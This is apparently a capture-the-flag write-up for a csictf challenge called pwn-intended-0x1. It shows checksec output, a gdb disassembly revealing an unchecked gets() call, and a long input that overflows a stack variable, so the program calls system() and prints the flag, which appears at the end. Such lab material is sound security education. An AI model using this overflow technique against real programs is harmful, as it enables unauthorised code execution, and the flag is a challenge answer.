Info

$file pwn-intended-0x1
pwn-intended-0x1: ELF 64-bit LSB executable, x86-64, version 1 (SYSV), dynamically linked, interpreter /lib64/ld-linux-x86-64.so.2, BuildID[sha1]=1fc0accd801ea951a4ec2f7f8c804e0559ccb1db, for GNU/Linux 3.2.0, not stripped

$ checksec pwn-intended-0x1
[*] /pwn-intended-0x1'
    Arch:     amd64-64-little
    RELRO:    Partial RELRO
    Stack:    No canary found
    NX:       NX enabled
    PIE:      No PIE (0x400000)

Anaylsing binary 

gdb-peda$ disass main
Dump of assembler code for function main:
   0x0000000000401156 <+0>:	push   rbp
   0x0000000000401157 <+1>:	mov    rbp,rsp
   0x000000000040115a <+4>:	sub    rsp,0x30
   0x000000000040115e <+8>:	mov    DWORD PTR [rbp-0x4],0x0
   0x0000000000401165 <+15>:	mov    rax,QWORD PTR [rip+0x2ef4]        # 0x404060 <stdout@@GLIBC_2.2.5>
   0x000000000040116c <+22>:	mov    esi,0x0
   0x0000000000401171 <+27>:	mov    rdi,rax
   0x0000000000401174 <+30>:	call   0x401040 <setbuf@plt>
   0x0000000000401179 <+35>:	mov    rax,QWORD PTR [rip+0x2ef0]        # 0x404070 <stdin@@GLIBC_2.2.5>
   0x0000000000401180 <+42>:	mov    esi,0x0
   0x0000000000401185 <+47>:	mov    rdi,rax
   0x0000000000401188 <+50>:	call   0x401040 <setbuf@plt>
   0x000000000040118d <+55>:	mov    rax,QWORD PTR [rip+0x2eec]        # 0x404080 <stderr@@GLIBC_2.2.5>
   0x0000000000401194 <+62>:	mov    esi,0x0
   0x0000000000401199 <+67>:	mov    rdi,rax
   0x000000000040119c <+70>:	call   0x401040 <setbuf@plt>
   0x00000000004011a1 <+75>:	lea    rdi,[rip+0xe60]        # 0x402008
   0x00000000004011a8 <+82>:	call   0x401030 <puts@plt>
   0x00000000004011ad <+87>:	lea    rax,[rbp-0x30]
   0x00000000004011b1 <+91>:	mov    rdi,rax
   0x00000000004011b4 <+94>:	mov    eax,0x0
   0x00000000004011b9 <+99>:	call   0x401060 <gets@plt>
   0x00000000004011be <+104>:	lea    rdi,[rip+0xe5f]        # 0x402024
   0x00000000004011c5 <+111>:	call   0x401030 <puts@plt>
   0x00000000004011ca <+116>:	cmp    DWORD PTR [rbp-0x4],0x0
   0x00000000004011ce <+120>:	je     0x4011ed <main+151>
   0x00000000004011d0 <+122>:	lea    rdi,[rip+0xe59]        # 0x402030
   0x00000000004011d7 <+129>:	call   0x401030 <puts@plt>
   0x00000000004011dc <+134>:	lea    rdi,[rip+0xe94]        # 0x402077
   0x00000000004011e3 <+141>:	mov    eax,0x0
   0x00000000004011e8 <+146>:	call   0x401050 <system@plt>
   0x00000000004011ed <+151>:	mov    eax,0x0
   0x00000000004011f2 <+156>:	leave  
   0x00000000004011f3 <+157>:	ret    
End of assembler dump.

We can see gets function.so try it by giving some input 

gdb-peda$ r 
Starting program: pwn-intended-0x1 
Please pour me some coffee:
AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA

Thanks!

Oh no, you spilled some coffee on the floor! Use the flag to clean it.

process  is executing new program: /bin/dash
[New process]
process  is executing new program: /bin/cat


Its a easy bufferoverflow vulnerability.


flag csictf{y0u_ov3rfl0w3d_th@t_c0ff33_l1ke_@_buff3r}